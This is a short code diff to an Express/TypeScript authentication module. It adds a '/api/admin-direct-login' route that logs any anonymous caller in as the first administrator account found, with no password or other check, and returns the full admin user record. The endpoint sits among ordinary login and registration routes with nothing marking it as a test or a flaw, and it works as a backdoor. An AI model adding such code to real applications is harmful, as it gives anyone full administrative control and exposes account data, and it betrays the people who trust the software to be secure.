@@ -95,6 +95,24 @@ export async function setupAuth(app: Express) {
     })(req, res, next);
   });
 
+  app.post("/api/admin-direct-login", async (req, res, next) => {
+    try {
+      const allUsers = await storage.getAllUsers();
+      const admin = allUsers.find(u => u.role === 'admin' || u.role === 'super_admin');
+      
+      if (!admin) {
+        return res.status(404).json({ message: "No administrator account found" });
+      }
+
+      req.logIn(admin, (err) => {
+        if (err) return next(err);
+        return res.json({ message: "Admin direct login successful", user: admin });
+      });
+    } catch (error: any) {
+      next(error);
+    }
+  });
+
   app.post("/api/register", async (req, res) => {
     try {
       const { username, password, email, firstName, lastName } = req.body;
